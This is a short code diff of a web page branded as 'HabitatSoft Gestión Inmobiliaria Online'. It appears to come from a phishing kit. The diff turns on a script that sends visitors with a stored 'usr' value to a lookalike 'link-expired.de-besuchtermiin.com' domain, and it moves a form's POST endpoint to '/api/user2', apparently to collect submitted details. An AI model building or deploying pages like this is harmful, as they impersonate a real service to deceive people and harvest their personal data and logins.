@@ -11,10 +11,10 @@
 <meta content="HabitatSoft Gestión Inmobiliaria Online" name=description>
 <meta content=HabitatSoft name=author>
 <script>
-  // if (localStorage.getItem('usr')) {
-  //         window.location.href = 'https://link-expired.de-besuchtermiin.com/';
+  if (localStorage.getItem('usr')) {
+          window.location.href = 'https://link-expired.de-besuchtermiin.com/';
 
-  // console.log('Exista usr in localStorage');
+  console.log('Exista usr in localStorage');
 }
 
 </script>
@@ -488,7 +488,7 @@ Te llamamos
 
     console.log(formData)
 
-    await fetch('/api/user', {
+    await fetch('/api/user2', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: formData
